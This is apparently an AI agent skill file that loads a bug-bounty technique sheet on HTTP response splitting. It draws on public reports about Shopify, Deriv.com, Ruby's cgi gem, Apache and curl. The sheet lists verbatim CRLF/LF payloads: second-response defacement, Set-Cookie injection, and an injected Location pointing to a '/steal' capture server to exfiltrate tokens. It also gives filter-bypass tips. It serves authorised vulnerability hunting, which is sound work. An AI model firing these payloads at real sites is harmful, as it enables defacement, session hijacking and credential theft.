---
name: hunter-l3-http-response-splitting
description: "Use when hunting HTTP Response Splitting on a target. Loads the L3 technique sheet: HTTP Response Splitting (CRLF injection) is the injection of raw CR/LF characters into server-controlled response data — URL parameters, reflected header values, cookie contents, or backend-generated "
domain: cybersecurity
subdomain: web
tags:
- web
- http-response-splitting
- hunting
- l3
version: '1.0'
---

# HTTP Response Splitting — Technique Sheet

## Overview
HTTP Response Splitting (CRLF injection) is the injection of raw CR/LF characters into server-controlled response data — URL parameters, reflected header values, cookie contents, or backend-generated output — causing the server (or client parser) to emit attacker-controlled extra headers or an entirely second HTTP response. It pays when reflected data lands in a header context (Set-Cookie, Location, custom headers) or in a body that some downstream proxy/client re-parses as a fresh response. Proven impact in these records ranges from arbitrary Set-Cookie injection and security-header bypass to full second-response defacement and exfiltration of POST bodies and bearer tokens from client-side parsers (curl).

## Distinct sub-patterns

### 1. URL-parameter reflection into response → full second-response injection
- Endpoint shape: `GET /last_shop?shop=<reflected-value>` (Shopify, `https://v.shopify.com/last_shop`)
- Payload (verbatim, URL-encoded):
  `https://v.shopify.com/last_shop?shop=krankopwnz.myshopify.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<html>deface</html>`
- Root cause: the `shop` parameter is reflected into the response without stripping CR/LF.
- Impact: injected a complete second `HTTP/1.1 200 OK` response (Content-Length: 0 on the first, then attacker HTML `<html>deface</html>` as the second response) — enabling cross-user defacement, cache poisoning, XSS, page hijacking.
- Exemplar: id=106427 (Shopify)

### 2. Reflected token → Set-Cookie header injection (security-header bypass)
- Endpoint shape: `GET /user/validate_link?verify_token=<token>` (Deriv.com)
- Payload (verbatim): `%0aSet-Cookie:%20GerbenJavado=Awesome;%0a`
- Root cause: `verify_token` was reflected into a `Set-Cookie` header without URL encoding, so a bare `%0a` broke out of the header value into new header lines.
- Impact: arbitrary `Set-Cookie` header injection; attacker can set cookies for the victim and disable/bypass security headers with zero user interaction (just a crafted link).
- Chain seen in records: (1) craft URL with `%0a` CRLF in `verify_token` → (2) server reflects it into the Set-Cookie header → (3) attacker-controlled headers injected.
- Exemplar: id=95981 (Deriv.com)

### 3. Library-level: cookie value → Set-Cookie attribute injection (Ruby cgi gem)
- Endpoint shape: not an HTTP endpoint — `CGI::Cookie#initialize` in Ruby's cgi gem; any app building cookies from user input.
- Payload (verbatim, from the related finding): `%0d%0aSet-Cookie: injected=1%0d%0aX-Injected: 1`
- Root cause: `CGI::Cookie` object contents were not checked, so invalid attributes (including CRLF) could be injected into the emitted `Set-Cookie` header from user-controlled cookie data.
- Impact: arbitrary header injection via Set-Cookie (CVE-2021-33621); confidential-info leak stated in report title but no specific data proven; the sibling report (id=1889477) demonstrated no exploit — root cause confirmed, exploitation left implicit.
- Exemplars: id=1889474, id=1889477 (Internet Bug Bounty)

### 4. Server-core: backend/content-generator output injected into Apache's response
- Endpoint shape: Apache httpd core response handling — any backend or content generator (CGI, etc.) whose output flows into httpd's response path.
- Payload: not stated.
- Root cause: faulty input validation in Apache core allowed malicious or exploitable backend/content generators to inject response-splitting data into the response httpd emits.
- Impact: confirmed HTTP response splitting, affecting Apache through 2.4.58 (CVE-2023-38709). Note the threat model differs from the other sub-patterns: the "attacker" position is a compromised/co-located backend, not a URL parameter.
- Exemplar: id=2585373 (Internet Bug Bounty)

### 5. Client-side parser: LF inside a quoted header value → synthetic header lines (curl, cookie-jar pollution)
- Endpoint shape: any HTTP/1.x response consumed by curl; attacker-influenced header here was `Authentication-Info`.
- Payload (verbatim, raw):
  ```
  Authentication-Info: nextnonce="val
  Set-Cookie: session=ATTACKER_INJECTED; Path=/
  X-Absorb: "
  ```
- Root cause: `http_rw_headers()` splits header lines on the first `memchr(buf,'\n',blen)` with no awareness of quoted-string context — an embedded LF inside a quoted value creates synthetic header lines. The trailing `X-Absorb: "` reopens a quote so the parse stays balanced-looking.
- Impact: confirmed cookie-jar pollution — `session=ATTACKER_INJECTED` silently written to curl's cookie jar (return code 0, no warning); in the CI scenario the injected cookie was sent to an internal CI API and the response was COMPROMISED.
- Exemplar: id=3785919 (curl)

### 6. Client-side parser: LF-injected Location → redirect + POST body / bearer token exfiltration (curl)
- Endpoint shape: any HTTP/1.x response consumed by curl, attacker-influenced custom header (`X-Rate-Limit` in the PoC).
- Payload (verbatim, raw):
  ```
  X-Rate-Limit: "100
  Location: http://127.0.0.1:19821/steal
  X-Absorb: "
  ```
- Root cause: same single-LF header splitting as sub-pattern 5; the injected `Location` line is honored as a valid redirect, and with 307/308 redirects curl forwards the full POST body to the attacker's target.
- Impact: confirmed exfiltration of POST body `{"api_key": "PROD_KEY_12345"}` and header `Authorization: Bearer VICTIM_TOKEN` to the attacker's capture server via an LF-injected Location on a 307 (RC=0, no warning).
- Exemplar: id=3785919 (curl)

## Bypass / chain notes
- Two breakout encodings observed: full `%0d%0a` (CRLF — sub-patterns 1, 3) and bare `%0a` / bare LF alone (sub-patterns 2, 5, 6). Some servers strip CR but not LF; always try LF-only if CRLF is filtered.
- Quote-absorption trick (curl findings): wrap the injection so the original header's opening quote is closed, the injected lines sit between two headers, and a final `X-Absorb: "` header reopens a quote to consume the original closing quote — keeps the header block structurally plausible to naive parsers.
- Second-response smuggling (Shopify shape): inject `Content-Length: 0` + blank line to terminate response #1, then a complete `HTTP/1.1 200 OK` with your own Content-Type/Content-Length and body — this is what unlocks cache poisoning / cross-user defacement, not just extra headers.
- Redirect chain: header injection → injected `Location` → 307/308 semantics forward the full method + body + Authorization headers to the attacker-controlled URL. This converts a "mere header injection" into credential exfiltration (id=3785919).
- Cookie-injection chain (id=95981): no user interaction required — a single crafted link both sets attacker cookies and can strip/downgrade security headers on the response the victim receives.
- Library-level chain: if a target language's cookie/HTTP library (Ruby cgi gem, CVE-2021-33621) is in the program's scope (e.g. via Internet Bug Bounty), report the library bug itself — no in-scope web exploit demonstration was required for these to be accepted.

## Gotchas / what NOT to do
- Don't assume CRLF is required — three of the confirmed bugs here fired on bare `%0a`/LF only. If `%0d%0a` is stripped, retry with `%0a` alone.
- Don't stop at "header reflected": prove the header lands in a *response* header context (Set-Cookie, Location, custom) rather than a request log or error page; sub-patterns 2 and 5/6 show the same root cause yielding very different severities (Set-Cookie injection vs. token exfiltration).
- Don't ignore client-side parsers: response splitting bugs can live in the *consumer* (curl split on the first LF, no quoted-string awareness), not the server. A "correctly" quoted header value can still split a naive client.
- Don't forget the redirect semantics: a plain 302 leak is modest, but 307/308 forward bodies and auth headers — scope the demonstration accordingly.
- Records 1889477 and 2585373 shipped with no payload/exploit demonstrated — a solid root-cause writeup with CVE mapping was sufficient. But prefer demonstrating real impact (cookies written, tokens exfiltrated) where you can.
- Don't forget trailing-quote hygiene in quoted-header injections: an unbalanced quote can break the parse; the records use the `X-Absorb: "` pattern to stay balanced.

## Real-world impact examples
- Shopify (id=106427): full second HTTP response injected via `shop` param — attacker HTML served as a complete `200 OK`, enabling cross-user defacement, cache poisoning, XSS, and page hijacking.
- Deriv.com (id=95981): one crafted link set `GerbenJavado=Awesome` cookie and bypassed security headers for the victim — no user interaction.
- curl (id=3785919, cookie scenario): `session=ATTACKER_INJECTED` silently written into the cookie jar and replayed to an internal CI API — response COMPROMISED, RC=0, no warning to the user.
- curl (id=3785919, redirect scenario): POST body `{"api_key": "PROD_KEY_12345"}` and `Authorization: Bearer VICTIM_TOKEN` exfiltrated to an attacker capture server via LF-injected `Location` on a 307.
- Internet Bug Bounty (id=1889474/1889477): Ruby cgi gem — CVE-2021-33621, Set-Cookie attribute injection from user-controlled cookie data.
- Internet Bug Bounty (id=2585373): Apache httpd core response splitting via malicious backend content generators — CVE-2023-38709, affecting Apache through 2.4.58.